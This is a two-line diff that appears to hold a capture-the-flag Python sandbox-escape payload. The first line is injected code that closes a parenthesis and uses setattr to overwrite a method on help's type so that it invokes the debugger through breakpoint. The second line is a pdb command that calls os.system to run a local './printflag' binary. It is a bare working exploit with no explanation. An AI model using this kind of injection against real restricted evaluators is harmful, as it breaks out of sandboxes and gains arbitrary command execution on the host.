@@ -1,0 +1,2 @@
+),setattr(type(help),dir(id)[21],lambda*a:(breakpoint,())),help,(
+p __import__("os").system("./printflag")
